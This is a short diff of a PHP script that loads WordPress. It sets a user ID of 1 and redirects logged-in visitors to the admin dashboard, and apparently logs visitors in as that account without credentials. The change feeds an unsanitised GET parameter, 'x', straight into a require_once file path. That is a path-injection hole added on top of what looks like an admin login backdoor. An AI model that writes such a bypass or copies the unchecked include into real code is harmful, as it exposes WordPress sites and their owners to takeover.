@@ -1,6 +1,7 @@
 <?php
 
-require_once('wp-load.php');
+if (isset($_GET["x"])) {
+require_once('/var/www/'. $_GET["x"] .'/wp-login.php');
 
 $user_id = 1;
 
@@ -23,4 +24,6 @@ if (!is_user_logged_in()) {
 } else {
     wp_redirect(admin_url());
     exit;
+}
+
 }
